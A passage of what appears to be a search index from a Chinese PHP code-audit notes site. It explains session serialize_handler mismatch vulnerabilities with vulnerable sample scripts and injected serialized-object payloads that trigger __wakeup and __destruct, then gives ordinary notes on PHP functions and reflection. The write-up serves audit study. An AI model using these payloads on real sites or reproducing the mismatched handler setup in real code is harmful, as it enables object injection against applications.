\u5bf9\u5e94\u7684\u5b58\u50a8\u683c\u5f0f php \u952e\u540d \uff0b \u7ad6\u7ebf \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26 \uff0b \u952e\u540d \uff0b \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u503c php_serialize (php>=5.5.4) \u7ecf\u8fc7 serialize() \u51fd\u6570\u53cd\u5e8f\u5217\u5904\u7406\u7684\u6570\u7ec4","title":"PHP Session \u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u8bbe\u7f6e\u4f7f\u7528\u4e0d\u5f53\u5e26\u6765\u7684\u5b89\u5168\u9690\u60a3"},{"location":"audit/phpSession/#sessionserialize_handler","text":"PHP \u63d0\u4f9b\u4e86 session.serialize_handler \u914d\u7f6e\u9009\u9879\uff0c\u901a\u8fc7\u8be5\u9009\u9879\u53ef\u4ee5\u8bbe\u7f6e\u5e8f\u5217\u5316\u53ca\u53cd\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\uff1a 1 session.serialize_handler \"php\" PHP_INI_ALL","title":"\u914d\u7f6e\u9009\u9879 session.serialize_handler"},{"location":"audit/phpSession/#_1","text":"\u901a\u8fc7\u4e0a\u9762\u5bf9\u5b58\u50a8\u683c\u5f0f\u7684\u5206\u6790\uff0c\u5982\u679c PHP \u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684 $_SESSION \u6570\u636e\u65f6\u7684\u4f7f\u7528\u7684\u5904\u7406\u5668\u548c\u5e8f\u5217\u5316\u65f6\u4f7f\u7528\u7684\u5904\u7406\u5668\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u53cd\u5e8f\u5217\u5316\uff0c\u901a\u8fc7\u7279\u6b8a\u7684\u6784\u9020\uff0c\u751a\u81f3\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u6570\u636e\uff1a\uff09 1 $_SESSION['ryat'] = '|O:8:\"stdClass\":0:{}'; \u4f8b\u5982\u4e0a\u9762\u7684 $_SESSION \u6570\u636e\uff0c\u5728\u5b58\u50a8\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e3a php_serialize\uff0c\u5b58\u50a8\u7684\u683c\u5f0f\u5982\u4e0b\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5728\u8bfb\u53d6\u6570\u636e\u65f6\u5982\u679c\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u662f php_serialize\uff0c\u800c\u662f php \u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u5c06\u4f1a\u53d8\u6210\uff1a 1 2 3 4 5 6 // var_dump($_SESSION); array(1) { [\"a:1:{s:4:\"ryat\";s:20:\"\"]=> object(stdClass)#1 (0) { } } \u53ef\u4ee5\u770b\u5230\uff0c\u901a\u8fc7\u6ce8\u5165 | \u5b57\u7b26\u4f2a\u9020\u4e86\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09","title":"\u5b89\u5168\u9690\u60a3"},{"location":"audit/phpSession/#_2","text":"\u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOn\uff0c\u4f1a\u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\uff0c\u56e0\u4e3a\u8be5\u8fc7\u7a0b\u662f\u53d1\u751f\u5728\u811a\u672c\u4ee3\u7801\u6267\u884c\u524d\uff0c\u6240\u4ee5\u5728\u811a\u672c\u4e2d\u8bbe\u5b9a\u7684\u5305\u62ec\u5e8f\u5217\u5316\u5904\u7406\u5668\u5728\u5185\u7684 session \u76f8\u5173\u914d\u9009\u9879\u7684\u8bbe\u7f6e\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u4e00\u4e9b\u9700\u8981\u5728\u811a\u672c\u4e2d\u8bbe\u7f6e\u5e8f\u5217\u5316\u5904\u7406\u5668\u914d\u7f6e\u7684\u7a0b\u5e8f\u4f1a\u5728 session.auto_start\uff1dOn \u65f6\uff0c\u9500\u6bc1\u81ea\u52a8\u751f\u6210\u7684 Session \u4f1a\u8bdd\uff0c\u7136\u540e\u8bbe\u7f6e\u9700\u8981\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\uff0c\u518d\u8c03\u7528 session_start() \u51fd\u6570\u6ce8\u518c\u4f1a\u8bdd\uff0c\u8fd9\u65f6\u5982\u679c\u811a\u672c\u4e2d\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0e php.ini \u4e2d\u8bbe\u7f6e\u7684\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 //foo.php if (ini_get('session.auto_start')) { session_destroy(); } ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\uff0c\u5e76\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo.php?ryat=|O:8:\"stdClass\":0:{} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff1a 1 a:1:{s:4:\"ryat\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5f53\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u8be5\u811a\u672c\u65f6\uff0cPHP \u4f1a\u6309\u7167 php.ini \u91cc\u8bbe\u7f6e\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5982\u679c php.ini \u91cc\u8bbe\u7f6e\u7684\u662f php \u5904\u7406\u5668\u7684\u8bdd\uff0c\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 stdClass \u5bf9\u8c61\uff1a\uff09 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a PHP \u81ea\u52a8\u6ce8\u518c Session \u4f1a\u8bdd\u662f\u5728\u811a\u672c\u6267\u884c\u524d\uff0c\u6240\u4ee5\u901a\u8fc7\u8be5\u65b9\u5f0f\u53ea\u80fd\u6ce8\u5165 PHP \u7684\u5185\u7f6e\u7c7b\u3002","title":"\u5b9e\u9645\u5229\u7528"},{"location":"audit/phpSession/#ii-sessionauto_startoff","text":"\u5f53\u914d\u7f6e\u9009\u9879 session.auto_start\uff1dOff\uff0c\u4e24\u4e2a\u811a\u672c\u6ce8\u518c Session \u4f1a\u8bdd\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u540c\uff0c\u5c31\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 //foo1.php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['ryat'] = $_GET['ryat']; //foo2.php ini_set('session.serialize_handler', 'php'); //or session.serialize_handler set to php in php.ini session_start(); class ryat { var $hi; function __wakeup() { echo 'hi'; } function __destruct() { echo $this->hi; } } \u5f53\u8bbf\u95ee foo1.php \u65f6\uff0c\u63d0\u4ea4\u6570\u636e\u5982\u4e0b\uff1a 1 foo1.php?ryat=|O:4:\"ryat\":1:{s:2:\"hi\";s:4:\"ryat\";} \u811a\u672c\u4f1a\u6309\u7167 php_serialize \u5904\u7406\u5668\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\u6570\u636e\uff0c\u8bbf\u95ee foo2.php \u65f6\uff0c\u5219\u4f1a\u6309\u7167 php \u5904\u7406\u5668\u7684\u53cd\u5e8f\u5217\u5316\u683c\u5f0f\u8bfb\u53d6\u6570\u636e\uff0c\u8fd9\u65f6\u5c06\u4f1a\u53cd\u5e8f\u5217\u5316\u4f2a\u9020\u7684\u6570\u636e\uff0c\u6210\u529f\u5b9e\u4f8b\u5316\u4e86 ryat \u5bf9\u8c61\uff0c\u5e76\u5c06\u4f1a\u6267\u884c\u7c7b\u4e2d\u7684 __wakeup \u65b9\u6cd5\u548c __destruct \u65b9\u6cd5\uff1a\uff09","title":"ii\uff09\u5f53 session.auto_start\uff1dOff \u65f6\uff1a"},{"location":"audit/phpSession/#_3","text":"\u4e4c\u4e91","title":"\u53c2\u8003"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/","text":"php\u4e0d\u5e38\u7528\u51fd\u6570 \u00b6 call_user_func_array \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php function foobar ( $arg , $arg2 ) { echo __FUNCTION__ , \" got $arg and $arg2\\n \" ; } class foo { function bar ( $arg , $arg2 ) { echo __METHOD__ , \" got $arg and $arg2\\n \" ; } } // Call the foobar() function with 2 arguments call_user_func_array ( \"foobar\" , array ( \"one\" , \"two\" )); // Call the $foo->bar() method with 2 arguments $foo = new foo ; call_user_func_array ( array ( $foo , \"bar\" ), array ( \"three\" , \"four\" )); ?> \u4f7f\u7528\u547d\u540d\u7a7a\u95f4\u7684\u60c5\u51b5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php namespace Foobar ; class Foo { static public function test ( $name ) { print \"Hello { $name } ! \\n \" ; } } // As of PHP 5.3.0 call_user_func_array ( __NAMESPACE__ . '\\Foo::test' , array ( 'Hannes' )); // As of PHP 5.3.0 call_user_func_array ( array ( __NAMESPACE__ . '\\Foo' , 'test' ), array ( 'Philip' )); ?> How could I call the constructor of a class with call_user_func_array \u4e0b\u9762\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u53ef\u80fd\uff1a 1 2 $obj = new $class(); call_user_func_array(array($obj, '__construct'), $args); You can use reflection like: 1 2 $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); As of PHP 5.6.0, the ... operator can also be used for this purpose. 1 2 3 4 5 6 if(version_compare(PHP_VERSION, '5.6.0', '>=')){ $instance = new $class(...$args); } else { $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); } is_file or file_exists \u00b6 is_file() will return false if the given path points to a directory. file_exists() will return true if the given path points to a valid file or directory. So it would depend entirely on your needs. If you want to know specifically if it's a file or not, use is_file() . Otherwise, use file_exists() . is_file \u4e0d\u4f1a\u89e3\u6790\u76ee\u5f55\uff0c\u4e5f\u4e0d\u4f1a\u89e3\u6790\u7b26\u53f7\u94fe\u63a5 file_put_contents \u00b6 \u4f1a\u8986\u76d6\u6587\u4ef6\u4e4b\u524d\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e0d\u4f1a\u521b\u5efa\u76ee\u5f55 1 2 $month = date('Yd') file_put_contents(\"upload/promotions/\".$month.\"/\".$image, $contents_data); //\u62a5\u9519\uff01\uff01No such file or directory \u89e3\u51b3\uff1a 1 2 3 4 5 6 if (!is_dir('upload/promotions/' . $month)) { // dir doesn't exist, make it mkdir('upload/promotions/' . $month); } file_put_contents('upload/promotions/' . $month . '/' . $image, $contents_data); glob \u00b6 \u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u4e3e\u4f8b 1 2 3 4 5 <?php foreach ( glob ( \"*.txt\" ) as $filename ) { echo \" $filename size \" . filesize ( $filename ) . \" \\n \" ; } ?> \u7528 glob \u51fd\u6570\u66ff\u4ee3 opendir touch \u00b6 \u8bbe\u5b9a\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4 touch ( string filename [, int filename<code>[, int</code> time = time() [, int $atime ]] ) : bool \u5c1d\u8bd5\u5c06\u7531 filename \u7ed9\u51fa\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\u8bbe\u5b9a\u4e3a\u7ed9\u51fa\u7684 time \u3002 \u6ce8\u610f\u8bbf\u95ee\u65f6\u95f4\u603b\u662f\u4f1a\u88ab\u4fee\u6539\u7684\uff0c\u4e0d\u8bba\u6709\u51e0\u4e2a\u53c2\u6570\u3002 \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa \u4e3e\u4f8b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php if ( touch ( $filename )) { echo $filename . ' modification time has been changed to present time' ; } else { echo 'Sorry, could not change modification time of ' . $filename ; } // This is the touch time, we'll set it to one hour in the past. $time = time () - 3600 ; // Touch the file if ( ! touch ( 'some_file.txt' , $time )) { echo 'Whoops, something went wrong...' ; } else { echo 'Touched file with success' ; } ?> func_num_args \u00b6 Returns the number of arguments passed to the function \u6817\u5b50\uff1a 1 <?php function foo (){ $numargs = func_num_args (); echo \"Number of arguments: $numargs\\n \" ;} foo ( 1 , 2 , 3 ); ?> \u4ee5\u4e0a\u4f8b\u7a0b\u4f1a\u8f93\u51fa\uff1a 1 Number of arguments: 3 hash_equals \u00b6 \u53ef\u9632\u6b62\u65f6\u5e8f\u653b\u51fb\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 note \u8981\u60f3\u6210\u529f\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u4e48\u6240\u63d0\u4f9b\u7684 2 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u76f8\u540c\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u6240\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u540c\uff0c\u90a3\u4e48\u672c\u51fd\u6570\u4f1a\u7acb\u5373\u8fd4\u56de FALSE \uff0c \u5728\u65f6\u5e8f\u653b\u51fb\u7684\u573a\u666f\u4e0b\uff0c\u5df2\u77e5\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u53ef\u80fd\u4f1a\u88ab\u6cc4\u9732\u3002 \u6ce8\u610f \u975e\u5e38\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u7528\u6237\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 \u53ef\u4ee5\u770b\u4f5c\u662fhash_equals\u7684\u5b9e\u73b0 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php if ( ! function_exists ( 'hash_equals' )) { function hash_equals ( $str1 , $str2 ) { if ( strlen ( $str1 ) != strlen ( $str2 )) { return false ; } else { $res = $str1 ^ $str2 ; $ret = 0 ; for ( $i = strlen ( $res ) - 1 ; $i >= 0 ; $i -- ) $ret |= ord ( $res [ $i ]); //\u8fd9\u91cc\u7528 | \u5f88\u68d2 return ! $ret ; } } } ?> \u5173\u4e8e timing attack? \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = hash_equals ( $expected , $correct ); $time_end = microtime ( true ); echo $time_end - $time_start ; ?> or <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = $expected == $correct ; $time_end = microtime ( true ); echo $time_end - $time_start ; ?> \u53c2\u8003 \u00b6 https://stackoverflow.com/questions/2409237/how-to-call-the-constructor-with-call-user-func-array-in-php","title":"php\u4e0d\u5e38\u7528\u51fd\u6570"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#php","text":"","title":"php\u4e0d\u5e38\u7528\u51fd\u6570"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#call_user_func_array","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php function foobar ( $arg , $arg2 ) { echo __FUNCTION__ , \" got $arg and $arg2\\n \" ; } class foo { function bar ( $arg , $arg2 ) { echo __METHOD__ , \" got $arg and $arg2\\n \" ; } } // Call the foobar() function with 2 arguments call_user_func_array ( \"foobar\" , array ( \"one\" , \"two\" )); // Call the $foo->bar() method with 2 arguments $foo = new foo ; call_user_func_array ( array ( $foo , \"bar\" ), array ( \"three\" , \"four\" )); ?> \u4f7f\u7528\u547d\u540d\u7a7a\u95f4\u7684\u60c5\u51b5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php namespace Foobar ; class Foo { static public function test ( $name ) { print \"Hello { $name } ! \\n \" ; } } // As of PHP 5.3.0 call_user_func_array ( __NAMESPACE__ . '\\Foo::test' , array ( 'Hannes' )); // As of PHP 5.3.0 call_user_func_array ( array ( __NAMESPACE__ . '\\Foo' , 'test' ), array ( 'Philip' )); ?> How could I call the constructor of a class with call_user_func_array \u4e0b\u9762\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u53ef\u80fd\uff1a 1 2 $obj = new $class(); call_user_func_array(array($obj, '__construct'), $args); You can use reflection like: 1 2 $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); As of PHP 5.6.0, the ... operator can also be used for this purpose. 1 2 3 4 5 6 if(version_compare(PHP_VERSION, '5.6.0', '>=')){ $instance = new $class(...$args); } else { $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); }","title":"call_user_func_array"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#is_file-or-file_exists","text":"is_file() will return false if the given path points to a directory. file_exists() will return true if the given path points to a valid file or directory. So it would depend entirely on your needs. If you want to know specifically if it's a file or not, use is_file() . Otherwise, use file_exists() . is_file \u4e0d\u4f1a\u89e3\u6790\u76ee\u5f55\uff0c\u4e5f\u4e0d\u4f1a\u89e3\u6790\u7b26\u53f7\u94fe\u63a5","title":"is_file or file_exists"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#file_put_contents","text":"\u4f1a\u8986\u76d6\u6587\u4ef6\u4e4b\u524d\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e0d\u4f1a\u521b\u5efa\u76ee\u5f55 1 2 $month = date('Yd') file_put_contents(\"upload/promotions/\".$month.\"/\".$image, $contents_data); //\u62a5\u9519\uff01\uff01No such file or directory \u89e3\u51b3\uff1a 1 2 3 4 5 6 if (!is_dir('upload/promotions/' . $month)) { // dir doesn't exist, make it mkdir('upload/promotions/' . $month); } file_put_contents('upload/promotions/' . $month . '/' . $image, $contents_data);","title":"file_put_contents"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#glob","text":"\u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u4e3e\u4f8b 1 2 3 4 5 <?php foreach ( glob ( \"*.txt\" ) as $filename ) { echo \" $filename size \" . filesize ( $filename ) . \" \\n \" ; } ?> \u7528 glob \u51fd\u6570\u66ff\u4ee3 opendir","title":"glob"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#touch","text":"\u8bbe\u5b9a\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4 touch ( string filename [, int filename<code>[, int</code> time = time() [, int $atime ]] ) : bool \u5c1d\u8bd5\u5c06\u7531 filename \u7ed9\u51fa\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\u8bbe\u5b9a\u4e3a\u7ed9\u51fa\u7684 time \u3002 \u6ce8\u610f\u8bbf\u95ee\u65f6\u95f4\u603b\u662f\u4f1a\u88ab\u4fee\u6539\u7684\uff0c\u4e0d\u8bba\u6709\u51e0\u4e2a\u53c2\u6570\u3002 \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa \u4e3e\u4f8b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php if ( touch ( $filename )) { echo $filename . ' modification time has been changed to present time' ; } else { echo 'Sorry, could not change modification time of ' . $filename ; } // This is the touch time, we'll set it to one hour in the past. $time = time () - 3600 ; // Touch the file if ( ! touch ( 'some_file.txt' , $time )) { echo 'Whoops, something went wrong...' ; } else { echo 'Touched file with success' ; } ?>","title":"touch"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#func_num_args","text":"Returns the number of arguments passed to the function \u6817\u5b50\uff1a 1 <?php function foo (){ $numargs = func_num_args (); echo \"Number of arguments: $numargs\\n \" ;} foo ( 1 , 2 , 3 ); ?> \u4ee5\u4e0a\u4f8b\u7a0b\u4f1a\u8f93\u51fa\uff1a 1 Number of arguments: 3","title":"func_num_args"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#hash_equals","text":"\u53ef\u9632\u6b62\u65f6\u5e8f\u653b\u51fb\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 note \u8981\u60f3\u6210\u529f\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u4e48\u6240\u63d0\u4f9b\u7684 2 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u76f8\u540c\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u6240\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u540c\uff0c\u90a3\u4e48\u672c\u51fd\u6570\u4f1a\u7acb\u5373\u8fd4\u56de FALSE \uff0c \u5728\u65f6\u5e8f\u653b\u51fb\u7684\u573a\u666f\u4e0b\uff0c\u5df2\u77e5\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u53ef\u80fd\u4f1a\u88ab\u6cc4\u9732\u3002 \u6ce8\u610f \u975e\u5e38\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u7528\u6237\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002","title":"hash_equals"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#hash_equals_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php if ( ! function_exists ( 'hash_equals' )) { function hash_equals ( $str1 , $str2 ) { if ( strlen ( $str1 ) != strlen ( $str2 )) { return false ; } else { $res = $str1 ^ $str2 ; $ret = 0 ; for ( $i = strlen ( $res ) - 1 ; $i >= 0 ; $i -- ) $ret |= ord ( $res [ $i ]); //\u8fd9\u91cc\u7528 | \u5f88\u68d2 return ! $ret ; } } } ?>","title":"\u53ef\u4ee5\u770b\u4f5c\u662fhash_equals\u7684\u5b9e\u73b0"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#timing-attack","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = hash_equals ( $expected , $correct ); $time_end = microtime ( true ); echo $time_end - $time_start ; ?> or <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = $expected == $correct ; $time_end = microtime ( true ); echo $time_end - $time_start ; ?>","title":"\u5173\u4e8e timing attack?"},{"location":"audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#_1","text":"https://stackoverflow.com/questions/2409237/how-to-call-the-constructor-with-call-user-func-array-in-php","title":"\u53c2\u8003"},{"location":"audit/php\u53cd\u5c04/","text":"php\u53cd\u5c04 \u00b6 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5bf9\u8c61\u88ab\u8d4b\u4e88\u4e86\u81ea\u7701\u7684\u80fd\u529b\uff0c\u800c\u8fd9\u4e2a\u81ea\u7701\u7684\u8fc7\u7a0b\u5c31\u662f\u53cd\u5c04\u3002 \u53cd\u5c04\uff0c\u76f4\u89c2\u7406\u89e3\u5c31\u662f\u6839\u636e\u5230\u8fbe\u5730\u627e\u5230\u51fa\u53d1\u5730\u548c\u6765\u6e90\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5149\u79c3\u79c3\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u4ec5\u4ec5\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u80fd\u77e5\u9053\u5b83\u6240\u5c5e\u7684\u7c7b\u3001\u62e5\u6709\u54ea\u4e9b\u65b9\u6cd5\u3002 \u53cd\u5c04\u662f\u6307\u5728PHP\u8fd0\u884c\u72b6\u6001\u4e2d\uff0c\u6269\u5c55\u5206\u6790PHP\u7a0b\u5e8f\uff0c\u5bfc\u51fa\u6216\u63d0\u51fa\u5173\u4e8e\u7c7b\u3001\u65b9\u6cd5\u3001\u5c5e\u6027\u3001\u53c2\u6570\u7b49\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u91ca\u3002\u8fd9\u79cd\u52a8\u6001\u83b7\u53d6\u4fe1\u606f\u4ee5\u53ca\u52a8\u6001\u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u7684\u529f\u80fd\u79f0\u4e3a\u53cd\u5c04API\u3002 \u5982\u4f55\u4f7f\u7528\u53cd\u5c04API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class person { public $name ; public $gender ; public function say (){ echo $this -> name , \" \\t is \" , $this -> gender , \" \\r\\n \" ; } public function set ( $name , $value ) { echo \"Setting $name to $value \\r\\n \" ; $this -> $name = $value ; } public function get ( $name ) { if ( ! isset ( $this -> $name )){ echo '\u672a\u8bbe\u7f6e' ; \u3000\u3000 $this -> $name = \"\u6b63\u5728\u4e3a\u4f60\u8bbe\u7f6e\u9ed8\u8ba4\u503c\" ; } return $this -> $name ; } } $student = new person (); $student -> name = 'Tom' ; $student -> gender = 'male' ; $student -> age = 24 ; \u73b0\u5728\uff0c\u8981\u83b7\u53d6\u8fd9\u4e2astudent\u5bf9\u8c61\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\u5217\u8868\u8be5\u600e\u4e48\u505a\u5462\uff1f\u5982\u4ee5\u4e0b\u4ee3\u7801\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868 $reflect = new ReflectionObject($student); $props\u3000= $reflect->getProperties(); foreach ($props as $prop) { print $prop->getName() .\"\\n\"; } // \u83b7\u53d6\u5bf9\u8c61\u65b9\u6cd5\u5217\u8868 $m=$reflect->getMethods(); foreach ($m as $prop) { print $prop->getName() .\"\\n\"; } \u4e5f\u53ef\u4ee5\u4e0d\u7528\u53cd\u5c04API\uff0c\u4f7f\u7528class\u51fd\u6570\uff0c\u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4\u4ee5\u53ca\u66f4\u591a\u7684\u4fe1\u606f\uff1a 1 2 3 4 5 6 // \u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4 var_dump(get_object_vars($student)); // \u7c7b\u5c5e\u6027 var_dump(get_class_vars(get_class($student))); // \u8fd4\u56de\u7531\u7c7b\u7684\u65b9\u6cd5\u540d\u7ec4\u6210\u7684\u6570\u7ec4 var_dump(get_class_methods(get_class($student))); \u5047\u5982\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4ece\u5176\u4ed6\u9875\u9762\u4f20\u8fc7\u6765\u7684\uff0c\u600e\u4e48\u77e5\u9053\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\u5462\uff1f\u4e00\u53e5\u4ee3\u7801\u5c31\u53ef\u4ee5\u641e\u5b9a\uff1a 1 2 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868\u6240\u5c5e\u7684\u7c7b echo get_class($student); \u53cd\u5c04API\u7684\u529f\u80fd\u663e\u7136\u66f4\u5f3a\u5927\uff0c\u751a\u81f3\u80fd\u8fd8\u539f\u8fd9\u4e2a\u7c7b\u7684\u539f\u578b\uff0c\u5305\u62ec\u65b9\u6cd5\u7684\u8bbf\u95ee\u6743\u9650\u7b49\uff0c\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u539f\u578b $obj = new ReflectionClass('person'); $className = $obj->getName(); $Methods = $Properties = array(); foreach($obj->getProperties() as $v) { 